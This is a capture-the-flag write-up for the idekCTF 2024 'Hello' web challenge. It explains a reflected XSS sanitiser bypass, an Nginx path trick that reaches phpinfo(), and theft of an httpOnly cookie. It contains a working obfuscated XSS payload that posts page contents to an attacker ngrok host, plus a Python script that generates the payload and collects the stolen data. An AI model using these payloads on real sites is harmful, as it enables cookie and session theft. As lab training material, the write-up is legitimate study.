# Hello

## Table of Contents

  1. [Overview](#overview)  
  2. [Background](#background)  
  3. [Enumeration](#enumeration)  
    3.1. [Hunting For XSS](#hunting-for-xss)  
    3.2. [Bypassing Cookie Attribute `httpOnly`](#bypassing-cookie-attribute-httponly)  
  4. [Exploitation](#exploitation)  
  5. [Conclusion](#conclusion)  

## Overview

- Solved by: @siunam, @colonneil
- 161 solves / 135 points
- Author: @Abdelhameed Ghazy
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

Just to warm you up for the next Fight :"D

Note: the admin bot is not on the same machine as the challenge itself and the _.chal.idek.team:1337 URL should be used for the admin bot URL_

[http://idek-hello.chal.idek.team:1337](http://idek-hello.chal.idek.team:1337)

[Admin Bot](https://admin-bot.idek.team/idek-hello)

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819135020.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819135153.png)

Huh, it seems empty. Let's read this web application's source code and figure out why it has no content.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/web/Hello/idek-hello.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2024/web/Hello)-[2024.08.19|13:53:13(HKT)]
└> file idek-hello.tar.gz                                                                              
idek-hello.tar.gz: gzip compressed data, was "idek-hello.tar", max compression, original size modulo 2^32 30720
┌[siunam♥Mercury]-(~/ctf/idekCTF-2024/web/Hello)-[2024.08.19|13:53:15(HKT)]
└> tar xvzf idek-hello.tar.gz 
attachments/
attachments/bot.js
attachments/docker-compose.yml
attachments/hello/
attachments/hello/Dockerfile
attachments/hello/init.sh
attachments/hello/nginx.conf
attachments/hello/src/
attachments/hello/src/index.php
attachments/hello/src/info.php
```

After reading the source code, we have the following findings:
1. This web application is written in PHP and uses Nginx for the HTTP server.
2. The Nginx configuration file contains a rule that denies all users except `127.0.0.1`.

Let's dive deeper!

First off, what's our objective in this challenge? Where's the flag?

In `attachments/bot.js`, we can see that it uses the JavaScript library [Puppeteer](https://pptr.dev/) to simulate an admin user. Upon closer look, we can see that **the flag is in the bot's cookie, named `FLAG`**:

```javascript
let puppeteer;
const { parseArgs } = require("util");

const options = {
    CHALLENGE_ORIGIN: {
        type: "string",
        short: "c",
        default: "http://localhost:1337"
    }
};

let {
    values: { CHALLENGE_ORIGIN },
    positionals: [ TARGET_URL ]
} = parseArgs({ args: process.argv.slice(2), options, strict: false });
[...]
puppeteer = require("puppeteer");
const sleep = d => new Promise(r => setTimeout(r, d));

const visit = async () => {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            pipe: true,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--js-flags=--noexpose_wasm,--jitless",
            ],
            dumpio: true
        });

        const ctx = await browser.createBrowserContext();

        const page = await ctx.newPage();
        await page.goto(CHALLENGE_ORIGIN, { timeout: 3000 });
        await page.setCookie({ name: 'FLAG', value: 'idek{PLACEHOLDER}', httpOnly: true });
        await page.goto(TARGET_URL, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(5000);

        await browser.close();
        browser = null;
    } catch (err) {
        console.log(err);
    } finally {
        if (browser) await browser.close();
    }
};

visit();
```

The code itself is pretty self-explanatory:
1. Launch a [headless Chromium browser](https://chromium.googlesource.com/chromium/src/+/lkgr/headless/README.md).
2. Open a new tab and go to URL `CHALLENGE_ORIGIN`, which is `http://localhost:1337` by default.
3. In this page, set a new cookie named `FLAG` with the value of the flag. It also sets the cookie attribute [`httpOnly`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#httponly) to `true`.
4. After setting the flag cookie, go to URL `TARGET_URL`, which is our provided URL.

As you can see, this is the typical client-side challenge setup, where a bot visits our payload and exfiltrates the cookie.

With that being said, our goal in this challenge is to **steal the bot's `FLAG` cookie via a client-side vulnerability, such as XSS (Cross-Site Scripting)**.

However, the cookie's attribute `httpOnly` is set to `true`, which means **we can't use JavaScript API `document.cookie` to read the cookie**.

Luckily, there're plenty ways to bypass that. We'll figure that out later.

### Hunting For XSS

Now, let's find a client-side vulnerability!

In `attachments/hello/src/index.php`, we can see there's a very common pitfall of XSS vulnerability in PHP:

```php
<?php
[...]
if(isset($_GET['name']))
{
    $name=substr($_GET['name'],0,23);
    echo "Hello, ".Enhanced_Trim($_GET['name']);
}
?>
```

As you can see, this PHP script takes a GET parameter `name` and prints our parameter's value.

> Note: In variable `$name`, it grabs the first 23 characters of our parameter's value. However, this variable is not used in any way, so it's completely obsolete.

Hmm... I wonder if the function `Enhanced_Trim` sanitizes/HTML entity encodes our input or not. If not, it's very likely to be vulnerable to XSS. More specifically, it's reflected XSS, as it's like a mirror, it directly reflects our input in the response.

Well, this function does try to sanitize our input:

```php
function Enhanced_Trim($inp) {
    $trimmed = array("\r", "\n", "\t", "/", " ");
    return str_replace($trimmed, "", $inp);
}
```

In here, it replaces all occurrences of characters `\r` (Carriage Return), `\n` (Line Feed), `\t` (Tab), `/`, and the space character to an empty string.

Hmm... Maybe we can bypass that to achieve reflected XSS?

Now, let's try a simple XSS payload:

```html
<img src=x onerror=alert(document.domain)>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819164131.png)

As expected, it replaces our space characters to an empty string.

Let's try to bypass the sanitization!

In [HackTricks about XSS WAF bypass](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#waf-bypass-encoding-image), we can see this image:

![](https://book.hacktricks.xyz/~gitbook/image?url=https%3A%2F%2F129538173-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-L_2uGJGU7AVNRcqRvEi%252Fuploads%252Fgit-blob-dabf90386fb0b4f05fc3daadb4c3fffceed34767%252FEauBb2EX0AERaNK.jpg%3Falt%3Dmedia&width=768&dpr=1&quality=100&sign=ada3162b&sv=1)

In the above image, we can see that the space character could be bypassed via bytes `\x09`, `\x0a`, `\x0c`, `\x0d`, `\x20`, and `\x2f`!

To test this, we can fuzz the input by hand. Eventually, we'll find that `\x0c` works!

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819164918.png)

Nice! It looks like **function `Enhanced_Trim` did NOT sanitize `\f` (`\x0c`), which is the [Form feed](https://en.wikipedia.org/wiki/Page_break#Form_feed) character**.

### Bypassing Cookie Attribute `httpOnly`

Now that we found the reflected XSS vulnerability, we'll need to steal the bot's cookie `FLAG`.

In `attachments/bot.js`, we talked about the bot's cookie `FLAG` attribute `httpOnly` is set to `true`.

Hmm... How can we bypass that?

If we look at PHP script `attachments/hello/src/info.php`, it uses built-in function `phpinfo()` to output information about PHP's configuration:

```php
<?php
phpinfo();
?>
```

In this function, it also contains the details of the client, such as request header `User-Agent`, request parameters, **cookies**, and more.

We can test this locally! First, set up a PHP server with a script that contains function `phpinfo()`:

```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2024/web/Hello)-[2024.08.19|16:58:22(HKT)]
└> echo -n '<?php phpinfo(); ?>' > phpinfo.php
┌[siunam♥Mercury]-(~/ctf/idekCTF-2024/web/Hello)-[2024.08.19|16:58:57(HKT)]
└> php -S 0.0.0.0:80 phpinfo.php
[Mon Aug 19 16:59:03 2024] PHP 8.2.21 Development Server (http://0.0.0.0:80) started

```

Then, go to `http://localhost/` to view the current PHP's configuration:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819170128.png)

Next, create a new cookie for demonstration:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819170840.png)

Finally, refresh the page and search for `FLAG`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819171025.png)

As you can see, **our cookie `FLAG` with attribute `httpOnly` is displayed in the "PHP Variables" section**!

With that said, we can steal the bot's `FLAG` cookie via the `phpinfo()` page!

Let's try to go to `/info.php` to confirm it's working as expected:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819171227.png)

Umm... Wait, why it responds with HTTP status code "403 Forbidden"? Maybe the Nginx server has a config for this specific resource?

If we take a look at `attachments/hello/nginx.conf`, we can see the following config:

```
[...]
http {
    [...]
    server {
        listen       80;
        server_name  localhost;
        [...]
        location = /info.php {
            allow 127.0.0.1;
            deny all;
        }

        location ~ \.php$ {
            root           /usr/share/nginx/html;
            fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
            include fastcgi_params;  
            fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
        }
    }
}
```

In the [Nginx module `ngx_http_core_module`](http://nginx.org/en/docs/http/ngx_http_core_module.html), it defines a virtual `server`, which contains 2 [`location` directives](http://nginx.org/en/docs/http/ngx_http_core_module.html#location).

In the first `location` directive, it uses modifier `=` to find an exact match of the URL. In this case, it finds the exact match of `/info.php`. If this directive matches it, [Nginx module `ngx_http_access_module`](http://nginx.org/en/docs/http/ngx_http_access_module.html) directive `allow` and `deny` will only allow `127.0.0.1` (Local loopback address) and deny all other addresses to access `/info.php`.

With that said, this `location` directive only allows client IP address `127.0.0.1` to be able to access `/info.php`.

Hmm... No wonder why we're getting HTTP status code "403 Forbidden", because our client IP address is not `127.0.0.1`.

In the second `location` directive, it uses modifier `~`, which is **using regular expression (case-sensitive) to find URL that ends with `.php`**. If it matches, Nginx will use [module `ngx_http_fastcgi_module`](http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html) to execute PHP script via [PHP FPM](https://www.php.net/manual/en/install.fpm.php) (FastCGI Process Manager).

Huh? So **Nginx will parse our URL to PHP FPM if the URL ends with `.php`**?

Therefore, we can execute PHP script `/info.php` via this path: **`/info.php/.php`**.

In the above path, **Nginx will see `.php` doesn't exist, which falls back to the first occurrence of the found file**!

> Note: For more details, you can read [this StackExchange post](https://security.stackexchange.com/questions/177354/turned-on-cgi-fix-pathinfo-still-dangerous-in-nginx).

Let's try that:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819174215.png)

Nice! It worked!

## Exploitation

Armed with the above information, we can exfiltrate the bot's `FLAG` cookie via two steps:
1. Send a GET request to `/info.php/.php` to retrieve the cookie's value.
2. Send a request with the `FLAG` cookie to our attacker server.

Before we do that, in the `Enhanced_Trim` function, it also replaces the character `/`, which means we'll need to work around for the URLs.

To do so, we can base64 encode and decode our payload, then use the JavaScript `eval` function to execute our payload. Alternatively, we can use the `String` object's static method `fromCharCode` to convert ASCII code into ASCII characters.

Here's the Proof-of-Concept JavaScript payload:

```javascript
// http://idek-hello.chal.idek.team:1337/info.php/.php
const targetUrl = String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 105, 100, 101, 107, 45, 104, 101, 108, 108, 111, 46, 99, 104, 97, 108, 46, 105, 100, 101, 107, 46, 116, 101, 97, 109, 58, 49, 51, 51, 55, 47, 105, 110, 102, 111, 46, 112, 104, 112, 47, 46, 112, 104, 112);
// https://aaa-123-456-789-123.ngrok-free.app
const attackerUrl = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 97, 97, 97, 45, 49, 50, 51, 45, 52, 53, 54, 45, 55, 56, 57, 45, 49, 50, 51, 46, 110, 103, 114, 111, 107, 45, 102, 114, 101, 101, 46, 97, 112, 112);

fetch(targetUrl, {
        credentials: 'include'
    })
    .then(response => response.text())
    .then(data =>
        fetch(attackerUrl), {
            method: 'POST',
            body: JSON.stringify({
                text: data
            })
        }
    );
```

Alternatively, the same payload in one line:

```javascript
fetch(String.fromCharCode(104,116,116,112,58,47,47,105,100,101,107,45,104,101,108,108,111,46,99,104,97,108,46,105,100,101,107,46,116,101,97,109,58,49,51,51,55,47,105,110,102,111,46,112,104,112,47,46,112,104,112),{credentials:'include'}).then(response => response.text()).then(data => fetch(String.fromCharCode(104,116,116,112,115,58,47,47,97,97,97,45,49,50,51,45,52,53,54,45,55,56,57,45,49,50,51,46,110,103,114,111,107,45,102,114,101,101,46,97,112,112),{method:'POST',body:JSON.stringify({text:data})}));
```

Once we have the bot's `FLAG` cookie, we send it back to our attacker web server with a POST request.

> Note: You can send the cookie back to the attacker web server using the GET method. However, due to the URL character limit, you'll receive an HTTP status code of "[414 URI Too Long](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/414)". To solve this, you can use JavaScript to retrieve only the `FLAG` cookie's value. I didn't use the GET method because I didn't want to deal with this issue.

Final payload:

```
http://idek-hello.chal.idek.team:1337/?name=<img%0Csrc=x%0Conerror="fetch(String.fromCharCode(104,116,116,112,58,47,47,105,100,101,107,45,104,101,108,108,111,46,99,104,97,108,46,105,100,101,107,46,116,101,97,109,58,49,51,51,55,47,105,110,102,111,46,112,104,112,47,46,112,104,112),{credentials:'include'}).then(response => response.text()).then(data => fetch(String.fromCharCode(104,116,116,112,115,58,47,47,97,97,97,45,49,50,51,45,52,53,54,45,55,56,57,45,49,50,51,46,110,103,114,111,107,45,102,114,101,101,46,97,112,112),{method:'POST',body:JSON.stringify({text:data})}));">
```

To catch the exfiltrated `FLAG` cookie's value, I wrote a solve script to generate the payload and host a Flask web application:

<details>
    <summary>solve.py</summary>

    ```python
    #!/usr/bin/env python3
    import re
    import argparse
    from flask import Flask, request
    
    def parseArguments():
        from pathlib import Path
    
        defaultTargetBaseUrl = 'idek-hello.chal.idek.team:1337'
        argumentParser = argparse.ArgumentParser(Path(__file__).name)
        argumentParser.add_argument('-t', '--target-base', metavar='URL' , help=f'Target base URL. Default: "{defaultTargetBaseUrl}"', type=str, dest='targetBaseUrl', default=defaultTargetBaseUrl)
        argumentParser.add_argument('-a', '--attacker-url', metavar='URL' , help='Attacker URL, such as "https://aaaa-123-456-789-123.ngrok-free.app"', type=str, required=True, dest='attackerUrl')
        arguments = argumentParser.parse_args()
        return arguments
    
    def stringToAsciiCode(string):
        allAsciiCode = str()
        for character in string:
            allAsciiCode += str(ord(character)) + ','
        return allAsciiCode[:-1]
    
    def generatePayload(targetBaseUrl, attackerUrl):
        phpInfoUrl = f'http://{targetBaseUrl}/info.php/.php'
        payload = f'http://{targetBaseUrl}/?name=<img%0Csrc=x%0Conerror="fetch(String.fromCharCode({stringToAsciiCode(phpInfoUrl)}),{{credentials:\'include\'}}).then(response => response.text()).then(data => fetch(String.fromCharCode({stringToAsciiCode(attackerUrl)}),{{method:\'POST\',body:JSON.stringify({{text:data}})}}));">'
        
        return payload
    
    app = Flask(__name__)
    
    @app.route('/', methods=['GET', 'POST'])
    def index():
        if request.method != 'POST':
            return ''
        
        print('[+] Received a POST request. Searching for the flag...')
        
        FLAG_REGEX_PATTERN = re.compile('(idek{[!-z]*})')
        flagMatch = re.search(FLAG_REGEX_PATTERN, request.data.decode())
        if not flagMatch:
            print(f'[-] Couldn\'t get fhe flag')
            return ''
        
        flag = flagMatch.group(1)
        print(f'[+] Here\'s the flag: {flag}')
        return ''
    
    if __name__ == '__main__':
        arguments = parseArguments()
        
        generatedPayload = generatePayload(arguments.targetBaseUrl, arguments.attackerUrl)
        print(f'[*] Send the following payload to the admin bot:\n{generatedPayload}')
    
        print('[*] Waiting for incoming request...')
        app.run('0.0.0.0', port=80)
    ```

</details>

- Setup port forwarding via Ngrok:

```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2024/web/Hello)-[2024.08.19|18:03:25(HKT)]
└> ngrok http 80
[...]
Forwarding                    https://0c59-{REDACTED}.ngrok-free.app -> http://localhost:80            
[...]
```

- Run the solve script:

```shell
┌[siunam♥Mercury]-(~/ctf/idekCTF-2024/web/Hello)-[2024.08.19|18:02:58(HKT)]
└> python3 solve.py -a https://0c59-{REDACTED}.ngrok-free.app
[*] Send the following payload to the admin bot:
http://idek-hello.chal.idek.team:1337/?name=<img%0Csrc=x%0Conerror="fetch(String.fromCharCode(104,116,116,112,58,47,47,105,100,101,107,45,104,101,108,108,111,46,99,104,97,108,46,105,100,101,107,46,116,101,97,109,58,49,51,51,55,47,105,110,102,111,46,112,104,112,47,46,112,104,112),{credentials:'include'}).then(response => response.text()).then(data => fetch(String.fromCharCode(104,116,116,112,115,58,47,47,48,99,53,57,45,123,82,69,68,65,67,84,69,68,125,46,110,103,114,111,107,45,102,114,101,101,46,97,112,112),{method:'POST',body:JSON.stringify({text:data})}));">
[*] Waiting for incoming request...
 * Serving Flask app 'solve'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://10.69.96.69:80
Press CTRL+C to quit

```

- Send the payload to the admin bot:

![](https://github.com/siunam321/CTF-Writeups/blob/main/idekCTF-2024/images/Pasted%20image%2020240819180528.png)

- Profit:

```shell
[...]
Press CTRL+C to quit
[+] Received a POST request. Searching for the flag...
[+] Here's the flag: idek{Ghazy_N3gm_Elbalad}
127.0.0.1 - - [19/Aug/2024 18:04:47] "POST / HTTP/1.1" 200 -
```

We got the flag!

- **Flag: `idek{Ghazy_N3gm_Elbalad}`**

## Conclusion

What we've learned:

1. Reflect XSS and exfiltrating `httpOnly` cookies via Nginx misconfiguration and PHP `phpinfo()`